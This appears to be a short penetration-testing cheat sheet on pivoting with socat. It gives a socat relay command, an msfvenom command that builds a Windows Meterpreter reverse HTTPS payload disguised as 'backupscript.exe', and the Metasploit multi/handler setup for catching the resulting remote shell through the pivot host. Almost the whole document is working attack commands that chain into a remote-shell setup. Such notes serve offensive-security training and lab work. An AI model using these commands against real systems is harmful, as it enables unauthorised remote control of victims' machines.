**Overview:**
- Socat is a bidirectional relay tool that can create pipe sockets between two independent network channels without SSH tunneling. It acts as a redirector, listening on one host and port and forwarding traffic to another IP and port.
- In a typical scenario, socat runs on the pivot host, listening for connections from the Windows target and forwarding them transparently to the attack host's Metasploit handler.
---
## Socat Redirector

```bash
socat TCP4-LISTEN:8080,fork TCP4:<lhost>:80
```

Start the socat listener on the pivot host. Listens on port `8080` and forwards all traffic to port `80` on the attack host. `fork` allows handling multiple simultaneous connections.

---
## Payload Generation

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<pivot> LPORT=8080 -f exe -o backupscript.exe
```

Generate a reverse HTTPS payload pointing to the pivot host running socat. 

---
## Metasploit Handler

```
use exploit/multi/handler
```

Start the handler on the attack host. Configure `LHOST` and `LPORT` to match the attack host's listener. Upon payload execution on the Windows target, the connection is forwarded through socat and a Meterpreter session opens on the attack host.
